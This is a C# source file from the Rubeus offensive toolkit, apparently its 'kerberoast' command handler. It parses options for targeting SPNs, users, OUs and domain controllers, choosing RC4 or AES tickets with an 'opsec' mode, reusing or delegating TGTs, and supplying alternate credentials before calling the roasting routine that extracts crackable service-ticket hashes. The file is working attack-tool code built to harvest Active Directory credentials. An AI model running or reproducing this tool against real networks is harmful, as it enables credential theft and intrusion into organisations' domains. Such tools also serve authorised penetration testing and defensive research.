using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;


namespace Rubeus.Commands
{
    public class Kerberoast : ICommand
    {
        public static string CommandName => "kerberoast";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");

            string spn = "";
            List<string> spns = null;
            string user = "";
            string OU = "";
            string outFile = "";
            string domain = "";
            string dc = "";
            string ldapFilter = "";
            string supportedEType = "rc4";
            bool useTGTdeleg = false;
            bool listUsers = false;
            KRB_CRED TGT = null;
            string pwdSetAfter = "";
            string pwdSetBefore = "";
            int resultLimit = 0;
            bool simpleOutput = false;
            bool enterprise = false;

            if (arguments.ContainsKey("/spn"))
            {
                // roast a specific single SPN
                spn = arguments["/spn"];
            }

            if (arguments.ContainsKey("/spns"))
            {
                spns = new List<string>();
                if (System.IO.File.Exists(arguments["/spns"]))
                {
                    string fileContent = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(arguments["/spns"]));
                    foreach (string s in fileContent.Split('\n'))
                    {
                        if (!String.IsNullOrEmpty(s))
                        {
                            spns.Add(s.Trim());
                        }
                    }
                }
                else
                {
                    foreach (string s in arguments["/spns"].Split(','))
                    {
                        spns.Add(s);
                    }
                }
            }
            if (arguments.ContainsKey("/user"))
            {
                // roast a specific user (or users, comma-separated
                user = arguments["/user"];
            }
            if (arguments.ContainsKey("/ou"))
            {
                // roast users from a specific OU
                OU = arguments["/ou"];
            }
            if (arguments.ContainsKey("/domain"))
            {
                // roast users from a specific domain
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                // use a specific domain controller for kerberoasting
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                // output kerberoasted hashes to a file instead of to the console
                outFile = arguments["/outfile"];
            }
            if (arguments.ContainsKey("/simple"))
            {
                // output kerberoasted hashes to the output file format instead, to the console
                simpleOutput = true;
            }
            if (arguments.ContainsKey("/aes"))
            {
                // search for users w/ AES encryption enabled and request AES tickets
                supportedEType = "aes";
            }
            if (arguments.ContainsKey("/rc4opsec"))
            {
                // search for users without AES encryption enabled roast
                supportedEType = "rc4opsec";
            }
            if (arguments.ContainsKey("/ticket"))
            {
                // use an existing TGT ticket when requesting/roasting
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    TGT = new KRB_CRED(kirbiBytes);
                }
                else if (System.IO.File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = System.IO.File.ReadAllBytes(kirbi64);
                    TGT = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                }
            }

            if (arguments.ContainsKey("/usetgtdeleg") || arguments.ContainsKey("/tgtdeleg"))
            {
                // use the TGT delegation trick to get a delegated TGT to use for roasting
                useTGTdeleg = true;
            }

            if (arguments.ContainsKey("/pwdsetafter"))
            {
                // filter for roastable users w/ a pwd set after a specific date
                pwdSetAfter = arguments["/pwdsetafter"];
            }

            if (arguments.ContainsKey("/pwdsetbefore"))
            {
                // filter for roastable users w/ a pwd set before a specific date
                pwdSetBefore = arguments["/pwdsetbefore"];
            }

            if (arguments.ContainsKey("/ldapfilter"))
            {
                // additional LDAP targeting filter
                ldapFilter = arguments["/ldapfilter"].Trim('"').Trim('\'');
            }

            if (arguments.ContainsKey("/resultlimit"))
            {
                // limit the number of roastable users
                resultLimit = Convert.ToInt32(arguments["/resultlimit"]);
            }

            if (arguments.ContainsKey("/stats"))
            {
                // output stats on the number of kerberoastable users, don't actually roast anything
                listUsers = true;
            }

            if (arguments.ContainsKey("/enterprise"))
            {
                // use enterprise principals in the request, requires /spn and (/ticket or /tgtdeleg)
                enterprise = true;
            }

            if (arguments.ContainsKey("/creduser"))
            {
                // provide an alternate user to use for connection creds
                if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
                    return;
                }

                string[] parts = arguments["/creduser"].Split('\\');
                string domainName = parts[0];
                string userName = parts[1];

                // provide an alternate password to use for connection creds
                if (!arguments.ContainsKey("/credpassword"))
                {
                    Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
                    return;
                }

                string password = arguments["/credpassword"];

                System.Net.NetworkCredential cred = new System.Net.NetworkCredential(userName, password, domainName);

                Roast.Kerberoast(spn, spns, user, OU, domain, dc, cred, outFile, simpleOutput, TGT, useTGTdeleg, supportedEType, pwdSetAfter, pwdSetBefore, ldapFilter, resultLimit, listUsers, enterprise);
            }
            else
            {
                Roast.Kerberoast(spn, spns, user, OU, domain, dc, null, outFile, simpleOutput, TGT, useTGTdeleg, supportedEType, pwdSetAfter, pwdSetBefore, ldapFilter, resultLimit, listUsers, enterprise);
            }
        }
    }
}